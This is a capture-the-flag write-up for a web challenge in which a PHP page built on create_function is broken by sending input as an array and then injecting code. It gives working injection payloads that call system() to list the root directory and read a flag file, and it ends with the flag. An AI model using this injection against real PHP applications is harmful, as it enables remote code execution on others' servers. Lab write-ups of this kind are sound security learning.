# Challenge description

Ever since Claw's last encounter with the Inspector, he has been feeling very vindictive and angry. He hasn't even fed M.A.D. Cat correctly!

Thankfully, M.A.D. Cat knows their treats are stored in the nibbles directory!

Author: AtomicNicos
-----------------------------------------------------------

This challenge provides this page where we can only enter `echo "Hello World!";`

and anything else won't work

![image](https://user-images.githubusercontent.com/58823465/166170325-fb25173a-891f-4ef0-9770-7fdca2785a9f.png)

So trying different ways to break this i tried sending the code as an array, and bingo ! we get an interesting error 

![image](https://user-images.githubusercontent.com/58823465/166170340-16a43208-58d7-4a2d-b3df-31cc6915acde.png)

This means the "create_function" was used and this function can be exploited if the payload isn't sanitized, so we can inject arbitrary code and maybe get RCE !

More info about "create_function" code injection: 

-----------------------------------------------------------

https://www.exploit-db.com/exploits/32417

https://www.codetd.com/en/article/7175910

-----------------------------------------------------------

So using this payload we can get RCE 

``` code=1;}system(%27ls%20/%27);/* ``` 

![image](https://user-images.githubusercontent.com/58823465/166170373-0d777a68-fe58-4e97-bd07-55605fd3d9ae.png)


Next we just need to find the flag in the nibbles directory

````code=1;}system(%27cat%20./nibbles/flag.txt%27);/*````

``` Flag : DOCTF{G3TT1NG_RC3_(S0RRY_..._N1BBL3S)_1$_4LW4Y$_GR34T}  ```
